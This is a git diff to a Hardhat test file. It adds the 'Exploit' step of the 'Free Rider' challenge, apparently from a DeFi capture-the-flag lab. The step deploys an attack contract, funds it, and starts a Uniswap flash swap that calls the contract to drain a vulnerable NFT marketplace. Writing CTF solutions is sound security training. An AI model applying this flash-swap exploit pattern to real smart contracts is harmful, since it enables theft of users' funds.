@@ -105,6 +105,24 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        
+        //Let's start by deploying our attack contract
+        let freeRiderAttackFactory = await ethers.getContractFactory('FreeRiderAttack', attacker);
+        let freeRiderAttack = await freeRiderAttackFactory.deploy(
+            this.weth.address, this.marketplace.address, this.nft.address, this.buyerContract.address);
+
+        //need to send some eth to the attack contract (it needs some extra to pay back the fee for the flash swap)
+        await attacker.sendTransaction({ to: freeRiderAttack.address, value: ethers.utils.parseEther('0.45') });
+        
+        //initiate a flash swap in uniswap, instructing uniswap to call our attack contract. Check the FreeRiderAttackContract for the rest of the solution.
+        await this.uniswapPair.connect(attacker).swap(
+            ethers.utils.parseEther('30'),
+            0,
+            freeRiderAttack.address,
+            "0x1111111111111111111111111111111111111111111111111111111111111111"
+        )
+        
+
     });
 
     after(async function () {
